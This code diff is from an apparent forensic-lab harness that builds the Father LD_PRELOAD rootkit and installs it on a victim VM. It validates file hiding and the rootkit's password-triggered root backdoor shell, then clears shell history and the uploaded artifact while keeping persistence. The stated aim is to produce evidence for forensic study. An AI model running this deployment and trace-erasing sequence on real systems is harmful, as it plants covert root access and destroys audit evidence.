@@ -10,22 +10,24 @@ import yaml
 
 from orchestrator.core import console
 from orchestrator.core.provenance import file_sha256
-from orchestrator.core.ssh_client import SSHClient
+from orchestrator.core.ssh_client import SSHClient, SSHTerminal
 from scenarios.command_log import record_operation, run_logged_command
 
 SCENARIO_ID = "userland_father_ldpreload"
-CLEANUP_SCENARIO_ID = "userland_father_ldpreload_cleanup"
 ROOT = Path(__file__).resolve().parent
 ARCHIVE = ROOT / "files/father-upstream-4eb2712.tar"
 BUILD_SCRIPT = ROOT / "files/build.sh"
 LOCK = ROOT / "father.lock.yml"
 ARTIFACT_NAME = "rk.so"
 
-REMOTE_ROOT = "/tmp/forensic-lab/father_ldpreload"
-UPLOAD_PATH = "/tmp/father-upstream-4eb2712.tar"
-REMOTE_BUILD_ROOT = "/tmp/forensic-lab/father_build"
-REMOTE_BUILD_SCRIPT = "/tmp/father-build.sh"
-REMOTE_ARTIFACT = f"/tmp/{ARTIFACT_NAME}"
+# Paths on the builder VM, used only by the build path.
+_BUILDER_ARCHIVE = "/tmp/father-upstream-4eb2712.tar"
+_BUILDER_SCRIPT = "/tmp/father-build.sh"
+_BUILDER_BUILD_ROOT = "/tmp/forensic-lab/father_build"
+
+# Paths on the victim VM. This is the evidence surface a run leaves behind.
+VICTIM_ROOT = "/tmp/forensic-lab/father_ldpreload"
+VICTIM_ARTIFACT = f"/tmp/{ARTIFACT_NAME}"
 
 # Father defaults
 INSTALLED_LIBRARY = "/lib/selinux.so.3"
@@ -38,11 +40,11 @@ SHELL_MARKER = b"Enjoy the shell!"
 # Only intentional Father customization
 HIDDEN_PREFIX = "__malicious_"
 HIDDEN_FILE_NAME = f"{HIDDEN_PREFIX}file"
-HIDDEN_DIR = f"{REMOTE_ROOT}/probe"
+HIDDEN_DIR = f"{VICTIM_ROOT}/probe"
 LIST_HIDDEN_DIR = f"ls -la -- {HIDDEN_DIR}"
 
-CLEANUP_COMMANDS = (
-    f"rm -f -- {REMOTE_ARTIFACT}",
+_CLEANUP_COMMANDS = (
+    f"rm -f -- {VICTIM_ARTIFACT}",
     "history -c",
     'rm -f -- "${HISTFILE:-$HOME/.bash_history}"',
     "unset HISTFILE",
@@ -54,21 +56,15 @@ def run_father(
     transcript_path: Path,
     *,
     command_log_path: Path,
-    scenario_id: str,
     artifact_path: Path,
     build_record: dict,
 ) -> tuple[dict, Callable[[], None]]:
-    """Run Father visibly in Bash, then validate its native accept-hook shell."""
-    if scenario_id not in (SCENARIO_ID, CLEANUP_SCENARIO_ID):
-        raise ValueError(f"Unsupported Father scenario: {scenario_id}")
-
-    cleanup = scenario_id == CLEANUP_SCENARIO_ID
+    """Activate Father, clean its staging traces, and retain the live shell."""
     transcript_path.touch()
     console.scope("HOST", "stage Father artifact")
     _upload_artifact(ssh, command_log_path, artifact_path)
 
     terminal = ssh.open_terminal()
-    cleanup_facts = {}
     backdoor_socket = None
 
     def close_backdoor_socket() -> None:
@@ -79,133 +75,66 @@ def run_father(
         backdoor_socket = None
 
     try:
-        with terminal:
-            console.scope("GUEST", "verify prepared artifact")
-            guest_identity = run_logged_command(
-                terminal,
-                command_log_path,
-                ". /etc/os-release; "
-                "printf '%s-%s %s\\n' \"$ID\" \"$VERSION_ID\" \"$(uname -m)\"",
-                timeout=180,
-            ).combined_output
-            try:
-                expected = (
-                    f"{build_record['target']['distro_id']} "
-                    f"{build_record['target']['arch']}"
-                )
-                if guest_identity != expected:
-                    raise RuntimeError(
-                        f"Father artifact targets {expected}, guest is {guest_identity}"
-                    )
-            except Exception as exc:
-                record_operation(
-                    command_log_path, "verify_guest_identity", error=str(exc)
-                )
-                raise
-            record_operation(command_log_path, "verify_guest_identity")
-
-            console.scope("GUEST", "install and activate")
-            for command in (
-                f"mkdir -p {HIDDEN_DIR}",
-                f"sudo -n install -m 0644 {REMOTE_ARTIFACT} {INSTALLED_LIBRARY}",
-                f"touch {HIDDEN_DIR}/{HIDDEN_FILE_NAME}",
-            ):
-                run_logged_command(terminal, command_log_path, command, timeout=180)
-
-            visible_listing = run_logged_command(
-                terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
-            ).combined_output
-            if HIDDEN_FILE_NAME not in visible_listing:
-                raise RuntimeError("Controlled file was not visible before activation")
-
-            for command in (
-                f"printf '%s\\n' {INSTALLED_LIBRARY} "
-                f"| sudo -n tee {PRELOAD_CONFIG}",
-                "sudo -n systemctl restart ssh.service",
-            ):
-                run_logged_command(terminal, command_log_path, command, timeout=180)
-
-            console.scope("GUEST", "validate behavior")
-            hidden_listing = run_logged_command(
-                terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
-            ).combined_output
-            if HIDDEN_FILE_NAME in hidden_listing:
-                raise RuntimeError("Controlled file remained visible after activation")
-
-            console.scope("HOST", "validate Father backdoor")
-            try:
-                identity, backdoor_socket = _validate_backdoor(ssh)
-            except Exception as exc:
-                record_operation(command_log_path, "validate_backdoor", error=str(exc))
-                raise
-            record_operation(command_log_path, "validate_backdoor")
-
-            if cleanup:
-                console.scope("GUEST", "cleanup treatment")
-                for command in CLEANUP_COMMANDS:
-                    run_logged_command(
-                        terminal,
-                        command_log_path,
-                        command,
-                        timeout=180,
-                    )
-                uploaded_artifact_absent = run_logged_command(
-                    terminal,
-                    command_log_path,
-                    f"test ! -e {REMOTE_ARTIFACT}",
-                    timeout=180,
-                ).exit_code == 0
-                home_bash_history_absent = run_logged_command(
-                    terminal,
-                    command_log_path,
-                    'test ! -e "${HISTFILE:-$HOME/.bash_history}"',
-                    timeout=180,
-                ).exit_code == 0
-                persistence_present = run_logged_command(
-                    terminal,
-                    command_log_path,
-                    f"test -e {PRELOAD_CONFIG} && test -e {INSTALLED_LIBRARY}",
-                    timeout=180,
-                ).exit_code == 0
-                cleanup_facts = {
-                    "cleanup": {
-                        "uploaded_artifact_absent": uploaded_artifact_absent,
-                        "home_bash_history_absent": home_bash_history_absent,
-                        # One check, one field: the cleanup leaves the preload
-                        # config and the installed library in place.
-                        "persistence_present": persistence_present,
-                    }
-                }
-    except BaseException:
-        close_backdoor_socket()
-        raise
-    finally:
         try:
-            transcript_path.write_text(terminal.transcript, encoding="utf-8")
-        except BaseException:
-            close_backdoor_socket()
-            raise
+            with terminal:
+                _verify_guest_identity(terminal, command_log_path, build_record)
+                _activate_father(terminal, command_log_path)
+                _validate_file_hiding(terminal, command_log_path)
 
-    try:
-        facts = {
-            # Source provenance is not repeated here: the run stages build.json
-            # under inputs/ and records its hash in the manifest.
-            "installed_library_path": INSTALLED_LIBRARY,
-            "preload_config_path": PRELOAD_CONFIG,
-            "hidden_file_path": f"{HIDDEN_DIR}/{HIDDEN_FILE_NAME}",
-            "file_hiding_validated": True,
-            "backdoor_identity": identity,
-            "backdoor_connection_open_at_scenario_completion": True,
-            "trigger_source_port": SOURCE_PORT,
-            "listener_service": "sshd",
-            "listener_port": ssh.port,
-        }
-        facts.update(cleanup_facts)
-        assert backdoor_socket is not None
-        return facts, close_backdoor_socket
+                console.scope("HOST", "validate Father backdoor")
+                try:
+                    backdoor_socket, connection = _validate_backdoor(ssh)
+                except Exception as exc:
+                    record_operation(
+                        command_log_path, "validate_backdoor", error=str(exc)
+                    )
+                    raise
+                record_operation(command_log_path, "validate_backdoor")
+
+                # Persist the staging object before deleting it so the cleanup
+                # treatment has deterministic disk evidence for recovery.
+                console.scope("GUEST", "persist staging artifact")
+                run_logged_command(
+                    terminal, command_log_path, "sync", timeout=180
+                )
+                _cleanup_staging(terminal, command_log_path)
+        finally:
+            transcript_path.write_text(terminal.transcript, encoding="utf-8")
     except BaseException:
         close_backdoor_socket()
         raise
+
+    return {"backdoor_connection": connection}, close_backdoor_socket
+
+
+def build(
+    ssh: SSHClient,
+    staging: Path,
+    source: dict,
+) -> tuple[Path, str]:
+    """Build the pinned Father object on its builder VM."""
+    artifact = staging / ARTIFACT_NAME
+    ssh.put(ARCHIVE, _BUILDER_ARCHIVE)
+    ssh.put(BUILD_SCRIPT, _BUILDER_SCRIPT)
+    console.step(f"building {ARTIFACT_NAME}...")
+    stdout = ssh.run_checked(
+        f"bash {_BUILDER_SCRIPT} {_BUILDER_ARCHIVE} "
+        f"{_BUILDER_BUILD_ROOT} {HIDDEN_PREFIX}",
+        timeout=1800,
+    )
+    ssh.get(
+        f"{_BUILDER_BUILD_ROOT}/Father-{source['commit']}/{ARTIFACT_NAME}",
+        artifact,
+    )
+    return artifact, stdout
+
+
+def build_recipe() -> dict:
+    """Return the exact scenario-owned build recipe recorded by the host."""
+    return {
+        "sha256": file_sha256(BUILD_SCRIPT),
+        "hidden_prefix": HIDDEN_PREFIX,
+    }
 
 
 def verify_source() -> dict:
@@ -226,14 +155,88 @@ def verify_source() -> dict:
     }
 
 
+def _verify_guest_identity(
+    terminal: SSHTerminal,
+    command_log_path: Path,
+    build_record: dict,
+) -> None:
+    console.scope("GUEST", "verify prepared artifact")
+    guest_identity = run_logged_command(
+        terminal,
+        command_log_path,
+        ". /etc/os-release; "
+        "printf '%s-%s %s\\n' \"$ID\" \"$VERSION_ID\" \"$(uname -m)\"",
+        timeout=180,
+    ).combined_output
+    try:
+        expected = (
+            f"{build_record['target']['distro_id']} "
+            f"{build_record['target']['arch']}"
+        )
+        if guest_identity != expected:
+            raise RuntimeError(
+                f"Father artifact targets {expected}, guest is {guest_identity}"
+            )
+    except Exception as exc:
+        record_operation(command_log_path, "verify_guest_identity", error=str(exc))
+        raise
+    record_operation(command_log_path, "verify_guest_identity")
+
+
+def _activate_father(terminal: SSHTerminal, command_log_path: Path) -> None:
+    console.scope("GUEST", "install and activate")
+    for command in (
+        f"mkdir -p {HIDDEN_DIR}",
+        f"sudo -n install -m 0644 {VICTIM_ARTIFACT} {INSTALLED_LIBRARY}",
+        f"touch {HIDDEN_DIR}/{HIDDEN_FILE_NAME}",
+    ):
+        run_logged_command(terminal, command_log_path, command, timeout=180)
+
+    visible_listing = run_logged_command(
+        terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
+    ).combined_output
+    if HIDDEN_FILE_NAME not in visible_listing:
+        raise RuntimeError("Controlled file was not visible before activation")
+
+    for command in (
+        f"printf '%s\\n' {INSTALLED_LIBRARY} | sudo -n tee {PRELOAD_CONFIG}",
+        "sudo -n systemctl restart ssh.service",
+    ):
+        run_logged_command(terminal, command_log_path, command, timeout=180)
+
+
+def _validate_file_hiding(
+    terminal: SSHTerminal,
+    command_log_path: Path,
+) -> None:
+    console.scope("GUEST", "validate behavior")
+    hidden_listing = run_logged_command(
+        terminal, command_log_path, LIST_HIDDEN_DIR, timeout=180
+    ).combined_output
+    if HIDDEN_FILE_NAME in hidden_listing:
+        raise RuntimeError("Controlled file remained visible after activation")
+
+
+def _cleanup_staging(terminal: SSHTerminal, command_log_path: Path) -> None:
+    console.scope("GUEST", "cleanup staging traces")
+    for command in _CLEANUP_COMMANDS:
+        run_logged_command(terminal, command_log_path, command, timeout=180)
+    for command in (
+        f"test ! -e {VICTIM_ARTIFACT}",
+        'test ! -e "${HISTFILE:-$HOME/.bash_history}"',
+        f"test -e {PRELOAD_CONFIG} && test -e {INSTALLED_LIBRARY}",
+    ):
+        run_logged_command(terminal, command_log_path, command, timeout=180)
+
+
 def _upload_artifact(
     ssh: SSHClient,
     command_log_path: Path,
     artifact_path: Path,
 ) -> None:
-    console.step(f"Uploading {artifact_path.name} to {REMOTE_ARTIFACT}...")
+    console.step(f"Uploading {artifact_path.name} to {VICTIM_ARTIFACT}...")
     try:
-        ssh.put(artifact_path, REMOTE_ARTIFACT)
+        ssh.put(artifact_path, VICTIM_ARTIFACT)
     except Exception as exc:
         record_operation(command_log_path, "upload_artifact", error=str(exc))
         raise
@@ -242,7 +245,7 @@ def _upload_artifact(
 
 def _validate_backdoor(
     ssh: SSHClient,
-) -> tuple[str, socket.socket]:
+) -> tuple[socket.socket, dict]:
     console.step(
         f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
         f"{SOURCE_PORT}..."
@@ -254,6 +257,14 @@ def _validate_backdoor(
             timeout=12,
             source_address=("", SOURCE_PORT),
         )
+        client_address, client_port = client.getsockname()[:2]
+        server_address, server_port = client.getpeername()[:2]
+        connection = {
+            "client_address": client_address,
+            "client_port": client_port,
+            "server_address": server_address,
+            "server_port": server_port,
+        }
         with client.makefile("rb") as response:
             response.read(len(AUTHENTICATION_PROMPT))
             client.sendall(SHELL_PASSWORD)
@@ -273,7 +284,7 @@ def _validate_backdoor(
             raise RuntimeError("Father shell did not return the expected root identity")
         console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
         console.ok(f"Father shell identity: {identity}")
-        return identity, client
+        return client, connection
     except OSError as exc:
         if client is not None:
             client.close()
